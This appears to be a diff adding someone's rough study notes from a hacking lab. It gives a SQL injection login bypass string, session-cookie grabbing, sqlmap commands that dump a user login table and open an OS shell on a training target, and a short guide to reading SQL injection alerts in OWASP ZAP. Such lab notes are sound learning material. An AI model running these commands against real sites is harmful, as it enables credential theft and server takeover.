@@ -1,0 +1,35 @@
+website database user 
+- check for Credentials 
+anname' or 1=1 --
+- Copy the cookie value of user session lee in inspect element console, type document.cookie
+- sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --dbs
+- sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
+- sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
+
+, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.
+
+chekc for hostname
+
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump command to dump all the User_Login table content.
+
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell.  --os-shell is the prompt for an interactive OS shell.
+
+HOSTNAME
+TASKLIST EXE FILE , PID VALUE 
+
+
+
+
+------------
+
+OWASP ZAP  vulnerability 
+
+	9. Click on the discovered SQL Injection vulnerability and further click on the vulnerable URL.
+	10. You can observe the information such as Risk, Confidence, Parameter, Attack, etc., regarding the discovered SQL Injection vulnerability in the lower right-bottom, as shown in the screenshot.
+The risks associated with the vulnerability are categorized according to severity of risk as Low, Medium, High, and Informational alerts. Each level of risk is represented by a different flag color:
+	• Red Flag: High risk
+	• Orange Flag: Medium risk
+	• Yellow Flag: Low risk
+	• Blue Flag: Provides details about information disclosure vulnerabilities
+	
